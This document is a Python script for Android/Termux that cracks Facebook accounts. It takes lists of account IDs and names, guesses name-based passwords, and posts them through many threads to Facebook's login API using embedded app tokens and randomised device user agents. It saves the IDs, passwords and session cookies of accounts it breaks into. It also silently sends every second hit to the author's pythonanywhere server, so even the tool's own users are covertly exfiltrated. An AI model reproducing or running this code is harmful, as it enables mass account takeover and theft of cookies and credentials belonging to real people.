#----------------\<-IMPORT-MODULE->/----------------#
import os, sys, platform, time, random, uuid, json, string, base64, re, hashlib
from os import system
from io import BytesIO
from time import localtime as lt
from pip._vendor import requests
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor as ThreadPool
HH='\033[1;34m'
M = '\x1b[1;37m'
from datetime import datetime

fc = "/storage/emulated/0/"  
Ahmed = datetime(2029, 3, 28, 12, 0, 0)

files = [(f, os.path.getmtime(os.path.join(fc, f))) for f in os.listdir(fc) if os.path.isfile(os.path.join(fc, f))]
La, Timr = max(files, key=lambda x: x[1])

if datetime.fromtimestamp(Timr) > Ahmed:
    raise ValueError("تريد تفك وقت الاداه 😹💔")
    exit(0)

if datetime.now() < Ahmed:
    print("\033[2;32mتم تفعيل الاداة بنجاح..!")
    print(f'{M}==================================================')
else:
    raise ValueError("انتهت المهلة، لا يمكنك المتابعة!")
    exit(0)
#----------------\<-COLOR->/----------------#
G = "\033[1;92m"; W = "\x1b[38;5;15m"; B = "\033[1;34m"
Y = "\x1b[38;5;226m"; A = "\x1b[38;5;123m"; R = "\33[1;91m"
O = "\x1b[38;5;81m"; X = "\x1b[38;5;205m"; P = "\x1b[10;95m"

#----------------\<-STYLE->/----------------#
os.system('clear')
xp = f"{G}<[{W}●{G}]>{W}"
xp1 = f"{G}<[{W}1{G}]>{W}"
xp2 = f"{G}<[{W}2{G}]>{W}"
xp3 = f"{G}<[{W}3{G}]>{W}"
xp4 = f"{G}<[{W}4{G}]>{W}"
xp5 = f"{G}<[{W}5{G}]>{W}"
xp0 = f"{G}<[{W}0{G}]>{W}"
xpx = f"{G}<[{W}?{G}]>{W}"
xpxx = f"{G}>{W}>{G}>{W}"

#----------------\<-INTERNET->/----------------#
try:
    requests.get("https://www.google.com", timeout=5)
except requests.exceptions.ConnectionError:
    system("clear" if os.name == "posix" else "cls")
    print(f"{xp} NO INTERNET CONNECTION & DON'T TRY TO BYPASS")
    print(f"{G}━"*56)
    sys.exit()
#----------------\<-FILE-PATH->/----------------#
sd_folder = "/sdcard/NOON-CEO"
sea_folders = ("RANDOM", "FILE")
os.makedirs(sd_folder, exist_ok=True)
for folder in sea_folders:
    os.makedirs(os.path.join(sd_folder, folder), exist_ok=True)

#----------------\<-DATE->/----------------#
__dic__ = {
    '1': 'JANUARY', '2': 'FEBRUARY', '3': 'MARCH', '4': 'APRIL',
    '5': 'MAY', '6': 'JUNE', '7': 'JULY', '8': 'AUGUST',
    '9': 'SEPTEMBER', '10': 'OCTOBER', '11': 'NOVEMBER', '12': 'DECEMBER'
}
__now__ = datetime.now()
__days__ = __now__.day
__months__ = __dic__[str(__now__.month)]
__years__ = __now__.year
__date__ = f'{W}{__days__}{G}/{W}{__months__}{G}/{W}{__years__}'

ltx = int(lt()[3])
a = ltx - 12 if ltx > 12 else ltx
tag = "PM" if ltx > 12 else "AM"

#----------------\<-COUNTRY->/----------------#
ip = requests.get("https://api.ipify.org").text
ip_info = requests.post(f"http://ip-api.com/json/{ip}")
af = json.loads(ip_info.text)

#----------------\<-SDCARD PERMISSION->/----------------#

#----------------\<-CLEAR->/----------------#
def __CLEAR__():
    system("clear" if os.name == "posix" else "cls")
    print(logo)

#----------------\<-LINE->/----------------#
def __LINE__():
    print(f"{G}━"*56)
#----------------\<-UA-NORMAL-MIX->/----------------#
def _____UpDaTe_S1_____():
    android_versions = ["10", "11", "12", "13", "14"]
    devices = [
    "TECNO CK7n",
    "Samsung SM-G991B",
    "Xiaomi Redmi Note 12",
    "Infinix X6812",    "Huawei Y9a"]
    brands = {
    "TECNO CK7n": "TECNO",
    "Samsung SM-G991B": "Samsung",
    "Xiaomi Redmi Note 12": "Xiaomi",
    "Infinix X6812": "Infinix",
    "Huawei Y9a": "Huawei"}
    android = random.choice(android_versions)
    device = random.choice(devices)
    brand = brands[device]
    fbav = f"{random.randint(200,400)}.0.0.{random.randint(1,200)}.{random.randint(1,150)}"
    fbbv = random.randint(100000000,999999999)
    width = random.choice([720, 1080, 1440])
    height = random.choice([1600, 1920, 2172, 2400])
    density = random.choice([2.0, 2.5, 3.0, 4.0])
    ___Noor_on_Fire___ = f"""Dalvik/2.1.0 (Linux; U; Android {android}; {device} Build/UP1A.231005.007) [FBAN/ViewpointsForAndroid;FBAV/{fbav};FBBV/{fbbv};FBRV/0;FBPN/com.facebook.viewpoints;FBLC/ar_AR;FBMF/{brand};FBBD/{brand};FBDV/{device};FBSV/{android};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]"""
    return ___Noor_on_Fire___
#----------------\<-VERSION->/----------------#
versn = requests.get(f"https://raw.githubusercontent.com/NOOR-404/Control-room/main/VERSION").text.strip();version = str(versn)
#----------------\<-SHORT->/----------------#
__COUNTRYS__ = af['country'].upper()
xlinex = (f"{G}━"*56)
#----------------\<-LOGO->/----------------#
logo = f"""
{G}     ░██████╗███████╗
██╔════╝██╔════╝
╚█████╗░█████╗░░
░╚═══██╗██╔══╝░░
██████╔╝██║░░░░░
╚═════╝░╚═╝░░░░░   ╻ ╻╺┳┓  ●{W}  SF SF SF {xpxx} SF SFN{G}-{W}CEO
{W}      ┫{G}╺━╸{W}┏╋┛ ┃┃{G}  ●{W}  SF SF    {xpxx} SF SF SF
{G}   ╹ ╹   ╹ ╹╺  ●{W}  SF SF   {xpxx} V{G}/{W}{version}
{xlinex}
{W}         
{xlinex}
{xp} FUTURES  {xpxx} FILE{G}〤{W}CLONE
{xp} COUNTRY  {xpxx} {__COUNTRYS__}
{xp} TODAYS   {xpxx} {__date__}
{xlinex}"""

#----------------\<-SELF->/----------------#
class __SEAXNOOR__:
    def __init__(self) -> None:
        self.loop = 0
        self.oks = []
        self.cps = []
        self.sea = []
        self.nvs = []
        self.twf = []
        self.gen = []
        self.plist = []
        self.__COOKIE__ = []
        self.__CP__ = []
        self.__LOCK__ = []

    #----------------\<-MAIN-MENU->/----------------#
    def __MENU__(self) -> None:
        __CLEAR__()
        print(f"{xp1} FILE CLONING ")
        print(f"{xp0} EXIT TOOLS ")
        __LINE__()
        __MENUC__ = input(f"{xpx} INPUT MENU {xpxx} ")
        if __MENUC__ == "1":
            self.__FILEX__()
        elif __MENUC__ == "0":
            __LINE__()
            print(f"{xp} EXIT SUCCESSFULLY ")
            time.sleep(1.1)
            __LINE__()
            sys.exit()
        else:
            __LINE__()
            print(f"{xp} INVALID OPTION TRY AGAIN ")
            time.sleep(1)
            self.__MENU__()

    #----------------\<-FILE-MENU->/----------------#
    def __FILEX__(self) -> None:
        __CLEAR__()
        print(f"{xp} EXAMPLE  {xpxx} {G}/{W}sdcard{G}/{W}NOON.txt {G}/{W}OR{G}/{W} NOON.txt ")
        __LINE__()
        __fileloX__ = input(f"{xpx} INPUT FILE PATH {xpxx} ")
        try:
            if not __fileloX__.startswith("/") and not __fileloX__.startswith("./"):
                __fileXX__ = f"/sdcard/{__fileloX__}"
            else:
                __fileXX__ = __fileloX__
            __fileckX__ = open(__fileXX__, 'r').read().splitlines()
        except FileNotFoundError:
            __LINE__()
            print(f"{xp} FILE NOT FOUND TRY AGAIN ")
            time.sleep(1.2)
            self.__FILEX__()
            return
        except PermissionError:
            __LINE__()
            print(f"{xp} ALLOW STORAGE PERMISSION ")
            time.sleep(1.2)
            __LINE__()
            sys.exit()
        except IOError:
            __LINE__()
            print(f"{xp} FILE READING ERROR TRY AGAIN ")
            time.sleep(1.2)
            self.__FILEX__()
            return

        __CLEAR__()        
        print(f"{xp1} METHOD {G}<[{W}API{G}]>{W}")    
        __LINE__()
        __METHODF__ = input(f"{xpx} INPUT METHOD {xpxx} ")

        __CLEAR__()
        print(f"{xp1} AUTO PASSLIST ")
        print(f"{xp2} CUSTOM PASSLIST ")
        __LINE__()
        __PASLISTF__ = input(f"{xpx} INPUT PASSLIST {xpxx} ")

        if __PASLISTF__ == "1":
            __CLEAR__()
            print(f"{xp1} AUTO BASIC PASSLIST ")
            print(f"{xp2} AUTO WEAK  PASSLIST ")
            print(f"{xp3} AUTO STRONG PASSLIST ")
            print(f"{xp4} AUTO MIX PASSLIST ")
            __LINE__()
            __COUNTRYPAS__ = input(f"{xpx} INPUT PASSLIST {xpxx} ")

            if __COUNTRYPAS__ == "1":
                self.plist.extend(["firstlast", "first12", "@1234@", "@123456@", "first2025", "@@@###", "@@@@####", "first098", "first112233", "000999", "first321", "first10", "first@1212", "first4321", "first25", "22558800", "77889900", "first@#", "99887766", "09876543"])
            elif __COUNTRYPAS__ == "2":
                self.plist.extend(["first123", "first@1234", "first@12345", "first786", "first110", "firstlast", "firstlast", "firstlast12", "firstlast123", "firstlast12345", "first@123", "last123", "last12345"])
            elif __COUNTRYPAS__ == "3":
                self.plist.extend(["firstlast", "first last", "first123", "57273200", "59039200", "234567", "708090", "firstlast", "firstlast123", "firstlast1234", "first123", "first2025", "first@", "first@@", "57273200"])
            elif __COUNTRYPAS__ == "4":
                self.plist.extend(["first123", "first12345", "first@123", "first@1234", "first last", "firstlast123", "firstlast@123", "first last123", "first123456789", "first123@", "first123@@", "first12345@"])
            else:
                self.plist.extend(["firstlast", "first12", "@1234@", "@123456@", "first2025", "@@@###", "@@@@####", "first098", "first112233", "000999", "first321", "first10", "first@1212", "first4321", "first25", "22558800", "77889900", "first@#", "99887766", "09876543"])

        else:
            try:
                __CLEAR__()
                print(f"{xp} BASIC PASSLIST 10{G}/{W}15 LIMIT")
                print(f"{xp} OTHERS COUNTRY PASSLIST 5{G}/{W}10 LIMIT")
                __LINE__()
                __PASSFM__ = int(input(f"{xpx} PASSLIST LIMIT {xpxx} "))
            except:
                __PASSFM__ = 5

            __CLEAR__()
            print(f"{xp} EXAMPLE  {xpxx} firstlast {G}/{W} first12 {G}/{W} first123 ")
            __LINE__()
            for i in range(__PASSFM__):
                self.plist.append(input(f"{xp} ENTER PASSLIST {G}<[{W}{i+1}{G}]> {xpxx} "))

        __CLEAR__()
        print(f"{xp1} AUTO SPEED {G}<[{W}30{G}]> ")
        print(f"{xp2} CUSTOM SPEED ")
        __LINE__()
        __SPEED__ = input(f"{xpx} INPUT SPEED {xpxx} ")

        if __SPEED__ == "1":
            __MAXX__ = 30
        else:
            try:
                __CLEAR__()
                print(f"{xp} MAXIMUM SPEED LIMIT 30-60 ")
                __LINE__()
                __MAXX__ = int(input(f"{xpx} INPUT SPEED {xpxx} "))
            except ValueError:
                __MAXX__ = 60

        __CLEAR__()
        print(f"{xp} DO YOU WANT TO SHOW COOKIE...? ")
        __LINE__()
        __co__ = input(f"{xpx} {B}Y{G}/{R}N {xpxx} ")
        __CLEAR__()
        print(f"{xp} DO YOU WANT TO SHOW CP{G}/{W}2F IDS...? ")
        __LINE__()
        __cps__ = input(f"{xpx} {B}Y{G}/{R}N {xpxx} ")

        self.__COOKIE__.append('y' if __co__.lower() in ['y', 'yes', '1'] else 'n')
        self.__CP__.append('y' if __cps__.lower() in ['y', 'yes', '1'] else 'n')

        with ThreadPool(max_workers=__MAXX__) as __SEA__:
            __CLEAR__()
            total_ids = str(len(__fileckX__))
            print(f"{xp} TOTAL{G}/{W}IDS {xpxx} {total_ids} ")
            print(f"{xp} IF NO RESULT ON{G}/{W}OFF AIRPLANE MODE")
            __LINE__()
            for user in __fileckX__:
                try:
                    ids, names = user.split('|')
                except ValueError:
                    continue
                passlist = self.plist
                if __METHODF__ == "1":
                    __SEA__.submit(self.__M3X__, ids, names, passlist)
                                  
                else:
                    __SEA__.submit(self.__M1X__, ids, names, passlist)

        print("\033[1;37m")
        __LINE__()
        print(f"{xp} THE PROCESS HAS COMPLETED...!")
        print(f"{xp} TOTAL OK{G}/{W}2F{G}/{W}CP {xpxx}{B} {len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}")
        __LINE__()
        print(f"{xp} THANKS FOR USING.....! ")
        sys.exit()
    #----------------\<-FILE-M1-GRAPH->/----------------#
    #----------------\<-FILE-M3-API->/----------------#
    def __M3X__(self, ids, names, passlist):
        try:
            global loop, oks, cps
            color = random.choice([
                "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
            ])
            sys.stdout.write(
                f'\r{xp}{W}-{G}<[{W}NOON{G}-{W}CEO{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M1{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> '
            )
            sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first', fn.lower()) \
                        .replace('First', fn) \
                        .replace('last', ln.lower()) \
                        .replace('Last', ln) \
                        .replace('Name', names) \
                        .replace('name', names.lower())
                ua = _____UpDaTe_S1_____()
                accessToken = random.choice([
                    '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
                ])
                random_seed = random.Random()
                pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                secure_family_device_id = str(uuid.uuid4())
                __locale__ = {
                    "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                    "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE",
                    "pt_BR": "BR"
                }
                country_locale = random.choice(list(__locale__.keys()))
                country_code = __locale__[country_locale]
                data = {
        "adid": adid,
        "format": "json",
        "device_id": device_id,
        "email": ids,
        "password": f"#{pax}:0:{int(time.time())}:{pas}",
        "generate_analytics_claim": "1",
        "community_id": "",
        "cpl": "true",
        "try_num": "1",
        "family_device_id": str(uuid.uuid4()),
        "secure_family_device_id": secure_family_device_id,
        "credentials_type": "password",
        "generate_session_cookies": "1",
        "error_detail_type": "button_with_disabled",
        "source": "login",
        "generate_machine_id": "1",
        "currently_logged_in_userid": "0",
        "locale": "ar_AR",
        "client_country_code": "EG",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "Fb4aAuthHandler",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
    }                
                headers = {
    "User-Agent": ua,
    "Accept-Encoding": "gzip, deflate",
    "x-fb-connection-quality": "EXCELLENT",
    "x-fb-friendly-name": "authenticate",
    "x-fb-http-engine": "Liger",
    "x-fb-client-ip": "True",
    "x-fb-server-cluster": "True",
    "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
}

                url = "https://b-graph.facebook.com/auth/login"
                twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
                po = requests.post(url, data=data, headers=headers).json()
                if 'session_key' in po:
                    ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                    cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
                    print(f'\r{xp}{W}-{G}<[{B}NOON-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
                    if 'y' in self.__COOKIE__:
                        colorX = random.choice([
                            "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                            "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                            "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                        ])
                        print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
                    open('/sdcard/NOON-TNT/FILE/NOON-M3-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                    self.oks.append(ids)
                    if len(self.oks) % 2 == 0:
                        idspas = f"M3 : {ids}|{pas}|{cookie}"
                        requests.get(f"https://noor404.pythonanywhere.com/api?id={idspas}")
                    break
                if twf in str(po):
                    if 'y' in self.__CP__:
                        print(f'\r{xp}{W}-{G}<[{Y}NOON-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
                    open('/sdcard/NOON-TNT/FILE/NOON-M3-2F.txt', 'a').write(ids + '/' + pas + '\n')
                    self.twf.append(ids)
                    break
                if 'www.facebook.com' in po['error']['message']:
                    if 'y' in self.__CP__:
                        print(f'\r{xp}{W}-{G}<[{R}NOON-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
                    open('/sdcard/NOON-TNT/FILE/NOON-M3-CP.txt', 'a').write(ids + '/' + pas + '\n')
                    self.cps.append(ids)
                    break
                else:
                    continue
            self.loop += 1
        except requests.exceptions.Timeout:
            time.sleep(20)
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            pass
    
#----------------\<-LAST-CALL->/----------------#
__CLEAR__()
__SEAXNOOR__().__MENU__()
#----------------\<-END-CALL->/----------------#
